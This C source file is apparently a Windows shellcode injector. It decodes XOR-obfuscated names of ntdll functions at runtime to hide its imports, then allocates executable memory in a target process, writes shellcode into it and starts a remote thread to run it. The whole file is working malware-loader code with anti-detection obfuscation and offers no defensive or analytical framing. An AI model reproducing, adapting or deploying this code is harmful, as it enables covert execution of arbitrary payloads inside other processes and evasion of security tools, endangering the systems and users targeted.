#include <windows.h>

#include "injector/injector.h"

unsigned char *decrypt_func(unsigned char *data, int data_len, int xor_key)
{
    unsigned char *output;
    
    output = (unsigned char *)malloc(sizeof(unsigned char) * data_len + 1);

    for (int i = 0; i < data_len; i++)
        output[i] = data[i] ^ xor_key;

    return output;
}

void inject(HANDLE proc_handle, unsigned char *shellcode, unsigned long shellcode_len)
{
    unsigned char       *ntdll = NULL, *navm = NULL, *nwvm = NULL, *nct = NULL;
    HANDLE              thread_handle;
    HINSTANCE           ntdll_handle;
    NAVM                NtAllocateVirtualMemory = NULL;
    NWVM                NtWriteVirtualMemory = NULL;
    NCT                 NtCreateThreadEx = NULL;
    void                *alloc_addr = NULL;
    NTSTATUS            status;
    SIZE_T              alloc_size = shellcode_len;

    ntdll = decrypt_func("\x3d\x27\x37\x3f\x3f\x7d\x37\x3f\x3f\x53", 10, 0x53);
    navm = decrypt_func("\x1d\x27\x12\x3f\x3f\x3c\x30\x32\x27\x36\x05\x3a\x21\x27\x26\x32\x3f\x1e\x36\x3e\x3c\x21\x2a\x53", 24, 0x53);
    nwvm = decrypt_func("\x1d\x27\x04\x21\x3a\x27\x36\x05\x3a\x21\x27\x26\x32\x3f\x1e\x36\x3e\x3c\x21\x2a\x53", 21, 0x53);
    nct = decrypt_func("\x1d\x27\x10\x21\x36\x32\x27\x36\x07\x3b\x21\x36\x32\x37\x16\x2b\x53", 17, 0x53);

    ntdll_handle = LoadLibraryA(ntdll);

    NtAllocateVirtualMemory = (NAVM)GetProcAddress(ntdll_handle, navm);
    NtWriteVirtualMemory = (NWVM)GetProcAddress(ntdll_handle, nwvm);
    NtCreateThreadEx = (NCT)GetProcAddress(ntdll_handle, nct);
 
    status = NtAllocateVirtualMemory(proc_handle, &alloc_addr, 0, (PULONG)&alloc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    status = NtWriteVirtualMemory(proc_handle, alloc_addr, shellcode, shellcode_len, NULL);
    status = NtCreateThreadEx(&thread_handle, GENERIC_EXECUTE, NULL, proc_handle, alloc_addr, NULL, 0, 0, 0, 0, NULL);
    
    return;
}